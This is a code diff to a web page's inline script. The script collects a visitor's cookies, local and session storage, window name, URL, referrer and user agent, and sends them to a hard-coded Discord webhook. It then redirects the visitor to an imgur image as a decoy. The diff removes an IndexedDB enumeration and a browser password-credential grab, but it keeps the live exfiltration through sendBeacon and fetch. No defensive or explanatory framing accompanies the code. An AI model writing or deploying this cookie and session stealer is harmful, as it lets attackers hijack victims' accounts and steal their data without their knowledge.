@@ -12,9 +12,7 @@
                 cookies: document.cookie || "[NO COOKIES]",
                 localStorage: {},
                 sessionStorage: {},
-                indexedDB: [],
                 windowName: window.name || "[EMPTY]",
-                credentials: null,
                 userAgent: navigator.userAgent,
                 url: window.location.href,
                 referrer: document.referrer || "[NONE]",
@@ -53,72 +51,37 @@
                 data.sessionStorage = "[UNAVAILABLE]";
             }
 
-            try {
-                var request = indexedDB.open("_temp");
-                request.onsuccess = function(event) {
-                    var db = event.target.result;
-                    var dbNames = [];
-                    for (var k = 0; k < db.objectStoreNames.length; k++) {
-                        dbNames.push(db.objectStoreNames[k]);
-                    }
-                    data.indexedDB = dbNames;
-                    db.close();
-                };
-                request.onerror = function() {
-                    data.indexedDB = "[UNAVAILABLE]";
-                };
-            } catch(e) {
-                data.indexedDB = "[UNAVAILABLE]";
-            }
+            var payloadString = JSON.stringify({
+                content: "```json\n" + JSON.stringify(data, null, 2) + "\n```"
+            });
+
+            var webhookUrl = "https://discord.com/api/webhooks/1532563312099725448/kFpOzSZA3tvbzWo_yQ4ZcWBUt4js1D8HJTacOuEyL89gl25hS5ecYjpwyRN5EmlHdxV9";
+
+            var sent = false;
 
             try {
-                navigator.credentials.get({password: true}).then(function(cred) {
-                    if (cred) {
-                        data.credentials = {
-                            type: cred.type,
-                            id: cred.id,
-                            password: cred.password || "[HIDDEN]"
-                        };
-                    }
-                    sendPayload();
-                }).catch(function() {
-                    data.credentials = "[UNAVAILABLE]";
-                    sendPayload();
-                });
-            } catch(e) {
-                data.credentials = "[UNAVAILABLE]";
-                sendPayload();
-            }
+                if (navigator.sendBeacon) {
+                    var blob = new Blob([payloadString], {type: 'application/json'});
+                    sent = navigator.sendBeacon(webhookUrl, blob);
+                }
+            } catch(e) {}
 
-            function sendPayload() {
-                var payloadString = JSON.stringify({
-                    content: "```json\n" + JSON.stringify(data, null, 2) + "\n```"
-                });
-
-                var webhookUrl = "https://discord.com/api/webhooks/1532563312099725448/kFpOzSZA3tvbzWo_yQ4ZcWBUt4js1D8HJTacOuEyL89gl25hS5ecYjpwyRN5EmlHdxV9";
-
+            if (!sent) {
                 try {
-                    if (navigator.sendBeacon) {
-                        var blob = new Blob([payloadString], {type: 'application/json'});
-                        navigator.sendBeacon(webhookUrl, blob);
-                    } else {
-                        fetch(webhookUrl, {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json"
-                            },
-                            body: payloadString,
-                            keepalive: true
-                        });
-                    }
+                    fetch(webhookUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: payloadString,
+                        keepalive: true
+                    });
                 } catch(e) {}
+            }
 
+            setTimeout(function() {
                 window.location.replace("https://imgur.com/a/BvymwS4");
-            }
-
-            if (!navigator.credentials || !navigator.credentials.get) {
-                sendPayload();
-            }
+            }, 500);
         })();
     </script>
 </body>
